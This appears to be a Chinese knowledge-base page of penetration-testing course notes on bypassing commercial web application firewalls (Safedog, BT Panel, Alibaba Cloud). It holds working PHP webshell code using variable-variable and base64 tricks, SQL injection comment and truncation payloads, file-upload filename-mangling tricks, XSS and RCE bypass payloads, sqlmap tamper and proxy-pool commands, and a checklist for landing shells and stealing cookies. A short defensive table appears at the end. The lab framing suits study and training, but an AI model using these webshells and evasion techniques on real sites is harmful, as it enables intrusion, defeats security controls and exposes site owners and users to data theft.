---
title: XD安全 Day 46-49 WAF绕过技巧完整指南
description: 系统整理 XD安全渗透测试课程 Day 46-49 学习笔记，覆盖信息收集、漏洞发现、权限控制、漏洞利用四大阶段的 WAF 绕过实战技术。包含安全狗、宝塔、阿里云三大
  WAF 绕过策略，代理池、爬虫伪装、Payload 变异、Webshell 混淆加密、SQL注入/文件上传/XSS/RCE 绕过手法的完整技术体系。
category: program-analysis
tags:
- XD安全
- WAF绕过
- 渗透测试
- 安全狗
- 宝塔防火墙
- 阿里云盾
- 代理池
- 爬虫伪装
- Webshell混淆
- SQL注入绕过
- 文件上传绕过
- XSS绕过
- RCE绕过
- CC防护绕过
- 信息收集
- 漏洞发现
- 权限控制
- 漏洞利用
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本页面系统沉淀 **XD安全渗透测试课程 Day 46-49** 的 WAF 绕过技术栈，按渗透测试全生命周期四阶段结构化呈现：

| 阶段 | 核心目标 | 关键对抗目标 | 代表技术 |
|------|----------|--------------|----------|
| **Day 46 信息收集** | 目录扫描、指纹识别不被拦截 | 安全狗 CC 防护、宝塔 UA 黑名单、阿里云 IP 封禁 | 请求包模拟、爬虫 UA 伪装、代理池轮换 |
| **Day 47 漏洞发现** | 漏扫工具流量通过 WAF | 工具指纹识别、Payload 特征匹配、CC 限速 | 代理池集成、Burp Suite 中转限速、Xray/AWVS 联动、Tamper 脚本 |
| **Day 48 权限控制** | Webshell 落地与交互隐匿 | 关键字检测、流量特征分析、行为审计 | 变量覆盖、Base64/XOR 多层编码、ENPHP 混淆、在线加密 API、冰蝎双向加密、自研管理脚本 |
| **Day 49 漏洞利用** | SQLi/上传/XSS/RCE 实战绕过 | 关键词拦截、语法分析、文件内容检测 | 注释/编码/版本特性绕过、文件名变异、标签替换/模糊测试、关键字拼接/请求方法切换 |

> **实验环境**：阿里云 ECS + 宝塔面板（默认安装）+ 安全狗 Apache 版 + Pikachu 靶场源码  
> **代理池服务**：[快代理](https://www.kuaidaili.com/pricing/) 付费版（每次请求换 IP）

---

## Day 46：信息收集阶段 WAF 绕过

### 目录扫描误报根因分析

**现象**：工具扫描全显“存在”，手工访问 404 正常。  
**根因**：工具默认 `HEAD` 请求 + 简陋 Header 触发 WAF 统一返回 200/伪造响应。

**对比关键差异**：

| 字段 | 浏览器真实包 | 扫描器默认包 |
|------|--------------|--------------|
| Method | `GET` | `HEAD` |
| User-Agent | 完整浏览器 UA | 工具默认 UA |
| Accept | `text/html,application/xhtml+xml...` | 缺失或简写 |
| Connection | `keep-alive` | `close` |

**绕过策略**：**模拟真实用户完整请求包**  
- 修改工具请求方式为 `GET`  
- 补全 `User-Agent`、`Accept`、`Accept-Language`、`Connection` 等头  
- 结果：误报消失，真实 200/404 判断恢复准确

### 安全狗 CC 防护绕过

**触发条件**：单位时间请求数超阈值 → 判定非人类 → 拦截  
**绕过三板斧**：

1. **延时扫描** —— 降速至人类可接受频率（需自测平衡速度与通过率）  
2. **爬虫白名单伪装** —— 修改 `User-Agent` 为百度/360/Googlebot 等搜索引擎 UA  
   - 安全狗内置爬虫白名单，命中即跳过 CC 检测  
   - 实测：UA 伪装 + 高速扫描 **同时通过 CC 与目录发现**  
3. **代理池轮换** —— 单 IP 被封后自动切换新 IP（阿里云封禁约 1 小时自动解封）

> **工具化实现**：Python 脚本 + `requests` + 本地 Burp 代理观测 → 完全可控的请求构造  
> 交叉引用：[[burpsuite-basics-tutorial]] 中 Intruder/Proxy 实战配置

### 宝塔与阿里云叠加环境下的绕过决策树

| WAF | 爬虫白名单 | 延时有效 | 代理池有效 | 备注 |
|-----|------------|----------|------------|------|
| 安全狗 | ✅ | ✅ | ✅ | UA 伪装最划算 |
| 宝塔 | ❓ 未知 | ✅ | ✅ | 工具指纹库完善，需改 UA+延时 |
| 阿里云 | ❌ | ❌ | ✅ | 仅代理池可行 |
| **三者叠加** | ❌ | ❌ | ✅ | **仅代理池/高延时可行** |

> **日志利用**：宝塔拦截日志会记录被拦截的敏感路径（如 `/bak/`、`.sql`），可反向辅助信息收集。

---

## Day 47：漏洞发现阶段 WAF 绕过

### 三大触发点与对应对策

| 触发维度 | 典型特征 | 核心对策 |
|----------|----------|----------|
| **扫描速度** | 高频请求触发 CC | 代理池 / 延时 / 白名单 |
| **工具指纹** | UA、Header 顺序、参数命名 | 伪造真实浏览器 / 修改工具配置文件 |
| **漏洞 Payload** | `union select`、`<script>`、`../` 等特征 | 数据变异 / 加密编码 / 白名单绕过 |

### 代理池工程化部署

**开源方案**：[Proxy_Pool](https://github.com/jhao104/proxy_pool)  
- 需配置 `setting.py`（Server/Database/Redis）  
- 依赖：`redis`、`aiohttp`、`lxml` 等  
- 启动：`python scheduler.py` + `python api.py` → `http://127.0.0.1:5555/random` 获取可用 IP  

**生产建议**：**直接购买付费代理池**（快代理等），稳定性、可用率、更换频率均优于开源自建。

### 漏扫工具链组合拳：AWVS + Xray + Burp Suite

**拓扑**：`AWVS` → `Burp Suite (中转限速/改UA)` → `Xray (被动扫描)` → 目标  

| 组件 | 关键配置 | 作用 |
|------|----------|------|
| **AWVS** | `--user-agent=Baiduspider`、`Scan Speed=Slow` | 绕安全狗指纹+CC |
| **Burp Suite** | `Proxy Listeners` → `Upstream proxy servers` 指向 Xray；`Throttle` 限速 1 req/2s | 流量中转、速度控制、人工放包/按键精灵辅助 |
| **Xray** | `xray webscan --listen 127.0.0.1:7777 --html-output report.html` | 被动扫描、Payload 变异（XOR/注释/编码） |

**实战验证**：阿里云+宝塔+安全狗三重防护下，**代理池模式** AWVS 单独跑 / **组合模式** AWVS+Burp+Xray 均成功识别 Pikachu 靶场漏洞。

> 交叉引用：[[sqlmap-api-automation]] 中 `--tamper`/`--proxy`/`--random-agent` 参数对应同类绕过思路

---

## Day 48：权限控制阶段 Webshell 绕过与行为对抗

### Webshell 进化谱系

| 代数 | 技术特征 | 典型示例 | 对抗 WAF 效果 |
|------|----------|----------|---------------|
| **1️⃣ 简单后门** | `eval($_POST[x])` / `assert($_POST[x])` | 一句话木马 | ❌ 秒拦 |
| **2️⃣ 变量覆盖** | `$$a = $_GET[y]; $b($_POST[z]);` | 动态函数名调用 | ✅ 绕过静态关键词检测 |
| **3️⃣ 加密传输** | `base64_decode($_POST[x])` | 客户端编码、服务端解码 | ✅ 绕宝塔关键词（需注意变量名不含 `base64`） |
| **4️⃣ 混淆加密** | ENPHP / 在线加密 API / 自定义算法 | 源码级混淆、控制流平坦化 | ✅ 绕过特征匹配与语义分析 |
| **5️⃣ 异或加密** | Venom / 冰蝎 `^` 运算符动态生成 | 每次生成不同特征码 | ✅ 极强对抗静态规则 |
| **6️⃣ 双向加密通道** | 冰蝎 / 定制 AES/RSA | 请求/响应全加密、流量无明文特征 | ✅ 对抗流量审计、行为分析 |

> 交叉引用：[[php-webshell-obfuscation-av-evasion]] 详细记录 C++ 两阶段混淆实现；[[php-webshell-fundamentals-chopper-analysis]] 解析菜刀/蚁剑/冰蝎通信协议差异

### 关键绕过技术细节

#### 变量覆盖利用链
```php
<?php
$a = $_GET['x'];      // x=b
$$a = $_GET['y'];     // y=assert → $b = 'assert'
$b($_POST['z']);      // assert($_POST['z'])
?>
```
访问：`1.php?x=b&y=assert` + POST `z=phpinfo();`

#### Base64 传输绕宝塔
- **宝塔拦截点**：请求体含 `base64_decode` / `eval` / `assert` / `/*` 等  
- **绕过**：仅在 **服务端文件** 写 `base64_decode`，传输层仅传 Base64 字符串 → 变量名不含敏感词 → 通过  
- **客户端**：蚁剑/冰蝎编码器自动处理编解码

#### ENPHP 混淆实战
```bash
php code_test.php  # 输入原始后门 → 输出混淆后代码
```
混淆后代码仍能被 PHP 解释执行，安全狗不报警。

#### 在线加密 API 兜底
- [phpjiami.com](http://phpjiami.com/phpjiami.html) 等在线混淆服务  
- 本地工具过不去时，尝试不同在线引擎生成变体

#### 冰蝎双向加密流量特征
- **请求**：AES 加密 Payload + 密钥协商  
- **响应**：AES 加密结果  
- **WAF 视角**：全程高熵乱码，无敏感关键词、无固定特征码 → 极难基于内容拦截

### 自研权限维持脚本（绕过客户端特征）

**核心函数库**：
```php
// 目录列表
var_dump(scandir('.'));

// 写文件
file_put_contents('helloworld.txt', 'worldhello');

// 执行命令（配合异或后门）
system('whoami');
```
**优势**：无现成客户端指纹、流量特征可完全定制、功能模块化按需加载。

---

## Day 49：漏洞利用阶段核心漏洞类型绕过手法

### SQL 注入 WAF 绕过

#### 手工注入通用技巧
| 技巧 | Payload 示例 | 适用场景 |
|------|--------------|----------|
| **内联注释分割** | `un/**/ion sel/**/ect 1,2,3` | 关键词 `union` `select` 被拦截 |
| **版本特性注释** | `/*!44509 select */ 1,2,3` | MySQL ≥ 4.45.09 执行，其他视为注释 |
| **换行/URL 编码** | `union %23a%0Aselect 1,2,3%23` | 绕过单行过滤、`#` 被过滤 |
| **截断绕宝塔** | `id=1%00/**/union%00/**/select...` | 宝塔拦截 `/*`，`%00` 截断使其失效（PHP <5.3.4 + `magic_quotes_gpc=Off`） |

#### Sqlmap 自动化绕过参数
```bash
# 1. 伪装 UA
--user-agent="Mozilla/5.0 (compatible; Baiduspider/2.0)"
# 或
--random-agent

# 2. Tamper 脚本绕关键词
--tamper=rdog.py   # 安全狗专用
--tamper=space2comment,between,versionedkeywords  # 通用组合

# 3. 代理池绕 CC
--proxy=http://ip:port
# 或配合 Burp 上游代理实现动态换 IP
```

> 交叉引用：[[ctfshow-web-sql-injection-bypass-basics]] 系统整合 `intval`/`regex`/`进制转换`/`堆叠注入` 等进阶绕过；[[mysql-duplicate-entry-error-based-sqli]]、[[mysql-dnslog-injection-loadfile-unc]] 覆盖报错/盲注外带数据链路

### 文件上传 WAF 绕过

| 手法 | 核心原理 | 关键构造 |
|------|----------|----------|
| **垃圾数据溢出** | WAF 仅检测前 N 字节，超长填充使恶意内容越界 | `filename="x.jpg;` + `A*5000` + `;.php"` |
| **双引号变异** | 破坏 `filename="..."` 结构，WAF 解析失败 | `filename="x.php`（缺尾引号） |
| **分号截断** | WAF 以 `;` 为分隔符，取首段判断 | `filename="x.jpg;.php"` → WAF 只见 `x.jpg` |
| **换行绕过** | WAF 读取 `\n` 为字面，服务端解析为真换行 | `filename="x.\np\nh\np"` → 服务端得 `x.php` |
| **重复参数/白名单利用** | 利用解析器取最后/首值差异，或复用白名单字段值 | 多个 `filename`，最后为 `.php`；或 `filename="content-disposition..."` |

> 交叉引用：[[pikachu-target-writeup-part4]] 实战复现前端/MIME/`getimagesize`/图片马多层绕过

### XSS WAF 绕过

#### 手工六大类
1. **标签语法替代** — `<svg/onload=...>`、`<details/open/ontoggle=...>`  
2. **特殊符号干扰** — `<img src=x onerror=...>` 中插入零宽字符、异形空格  
3. **提交方式更改** — `GET` ↔ `POST`、JSON/Content-Type 切换  
4. **垃圾数据溢出** — 超长 Payload 使 WAF 截断漏过核心代码  
5. **加密解码执行** — `eval(atob('...'))`、JS 自解密  
6. **组合漏洞** — XSS + CSRF / SSRF / 模板注入 链式利用

#### XSStrike 自动化
```bash
python xsstrike.py -u "target" --fuzzer --timeout 1 --proxy http://ip:port
```
- `--fuzzer`：模糊测试过滤规则  
- `--timeout` / `--proxy`：绕 CC 限速

> 交叉引用：[[xss-haozi-lab-walkthrough]] 19 关完整绕过实录；[[attack-defense-world-beginner-web-writeup]] 基础 XSS 绕过合集

### RCE 命令/代码执行绕过

| 维度 | 绕过手法 | 示例 |
|------|----------|------|
| **关键字拦截** | 字符串拼接/替换/变量覆盖 | `$y=str_replace('x','','pxhpxinxfo()'); assert($y);` |
| **函数名黑名单** | 动态调用/回调函数/反射 | `call_user_func($_POST['f'], $_POST['c']);` |
| **请求方法切换** | POST→GET/COOKIE/HEADER 传参 | `$a=$_GET['x']; $$a=$_GET['y']; $b($_POST['z']);` 配合方法修改 |
| **编码传输** | Base64/URL/HEX/ROT13 多层 | `assert(base64_decode($_POST['x']));` 客户端多重编码 |
| **禁用函数绕过** | `LD_PRELOAD` / `putenv` / `imap` / `pcntl` / `ffi` 等 | 结合 [[ctf-show-php-command-execution-bypass-techniques]] `disable_functions` 完整利用链 |

> 交叉引用：[[php伪协议与反序列化利用]] 中 `php://filter`/`data://`/`gopher://` 等伪协议 RCE 链路

---

## 实战复现清单（可直接用于靶场验证）

| 场景 | 目标 WAF | 关键动作 | 预期结果 |
|------|----------|----------|----------|
| 目录扫描 | 安全狗(无CC) | 工具改 GET + 补全 Header | 无误报，准确 200/404 |
| 目录扫描 | 安全狗(开CC) | UA 伪装百度爬虫 + 全速跑 | 绕过 CC，正常识别文件 |
| 目录扫描 | 阿里云+宝塔+安全狗 | 付费代理池（每请求换 IP） | 三重防护下持续扫描不封 |
| AWVS 扫描 | 安全狗 | UA 伪装 + Slow Speed | 完成扫描不拦截 |
| AWVS+Xray 联动 | 三重防护 | Burp 中转限速 + Xray 被动扫描 | 识别 Pikachu 全漏洞类型 |
| Webshell 落地 | 宝塔+安全狗 | ENPHP 混淆 + Base64 传输 + 变量覆盖 | 文件上传成功、蚁剑连通 |
| SQLi 手工利用 | 宝塔 | `%00/**/` 截断注释 + 联合查询 | 拿到数据库/表/列/数据 |
| 文件上传 | 通用 WAF | 换行符 `x.\np\nh\np` + 双写 `filename` | 上传 `.php` 可执行文件 |
| XSS 存储型 | 过滤 `<script>` | `<svg/onload=alert(1)>` + 模糊测试 | 触发弹窗/窃取 Cookie |
| RCE 命令执行 | 禁用 `assert` | `str_replace` 拼接 `system` + 变量覆盖 | 执行任意系统命令 |

---

## 防御视角总结（蓝队参考）

| 攻击面 | 检测/缓解建议 |
|--------|---------------|
| **爬虫 UA 伪装** | 结合 IP 信誉、行为基线（请求间隔、路径遍历深度）、JS 挑战验证真实浏览器 |
| **代理池轮换** | 连接指纹识别（TLS JA3、HTTP/2 设置）、IP 归属地异常评分、频率自适应阈值 |
| **Payload 变异** | 语义级分析（AST 解析 SQL/JS/PHP）、规范化还原后再匹配、ML 异常检测 |
| **Webshell 文件落地** | 文件完整性监控（FIM）、PHP `disable_functions`/`open_basedir` 硬化、RASP 运行时 Hook `eval/assert/system` |
| **加密通道** | 流量熵值统计、长连接异常分析、TLS SNI/证书指纹校验、端点 EDR 行为审计 |
| **组合利用链** | 攻击图谱关联告警（MITRE ATT&CK 映射）、蜜签/蜜网诱捕横向移动 |

---

## 交叉引用知识库页面

- **基础工具与平台**：[[burpsuite-basics-tutorial]]、[[sqlmap-api-automation]]、[[pikachu-target-writeup-part4]]、[[attack-defense-world-beginner-web-writeup]]、[[ctfshow-web-sql-injection-bypass-basics]]
- **Webshell 专题**：[[php-webshell-fundamentals-chopper-analysis]]、[[php-webshell-obfuscation-av-evasion]]、[[php伪协议与反序列化利用]]
- **漏洞利用深度**：[[ctf-show-php-command-execution-bypass-techniques]]、[[ssrf-bypass-techniques]]、[[xss-haozi-lab-walkthrough]]、[[mysql-dnslog-injection-loadfile-unc]]、[[mysql-duplicate-entry-error-based-sqli]]
- **内网与权限**：[[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]、[[cobalt-strike-external-c2-smb-beacon]]、[[named-pipe-smb-detection-sysmon]]
- **课程体系导航**：[[xd-security-pentest-course-curriculum]]、[[xd-security-pentest-basic-stage-notes]]、[[xd-security-incident-response-notes]]

---

## 版本历史

| 版本 | 日期 | 变更摘要 |
|------|------|----------|
| 1.0 | 2024-01-15 | 初始版本：整合 Day 46-49 四阶段 WAF 绕过完整技术栈，建立跨页面交叉引用网络 |

---
*页面维护者：数字知识库策展人 | 数据源：XD安全微信公众号归档文章 | 更新周期：随课程进度同步迭代*

## 来源

- [0x00实验室-202108-202304_086](../sources/0x00实验室-202108-202304_086.md)
